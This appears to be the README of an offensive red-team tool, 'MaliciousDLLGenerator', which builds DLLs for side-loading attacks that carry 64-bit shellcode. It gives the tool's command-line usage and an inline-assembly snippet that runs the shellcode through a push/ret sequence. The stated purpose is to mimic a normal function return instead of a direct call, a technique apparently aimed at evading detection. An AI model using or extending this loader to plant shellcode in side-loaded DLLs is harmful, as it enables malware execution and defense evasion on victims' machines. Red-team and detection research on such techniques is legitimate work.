# MaliciousDLLGenerator

DLL Generator for side loading attack

### Currently only support 64 bits shellcode

# Usage

```
$ python gen-dll.py -h

MaliciousDLLGenerator - Mr.Un1k0d3r - RingZer0 Team
---------------------------------------------------


[-] Shellcode size is limited to 1024 bytes
usage: gen-dll.py [-h] -o OUTPUT -s SHELLCODE [-t TYPE]

optional arguments:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        Output filename
  -s SHELLCODE, --shellcode SHELLCODE
                        Raw shellcode file path
  -t TYPE, --type TYPE  DLL type (default,oart)
```

# Shellcode gadget

Instead of using the standard shellcode calling structure

```
char shellcode[] = {};
int(*execute)(void);
execute = (int(*)())shellcode;
execute();
```

Which result in the following assembly code

```
call rax
```

The DLL is mimicking a standard function return by using the following code

```
        CHAR payload[] = "";
        asm volatile ("mov %%rax, %0\n\t"
                     "push %%rax\n\t"
                     "ret"
                     :
                     : "r" (payload));
```

Which result in following assembly code

```
mov rax, rsp
push rax
ret
```

# Credit
Mr.Un1k0d3r RingZer0 Team
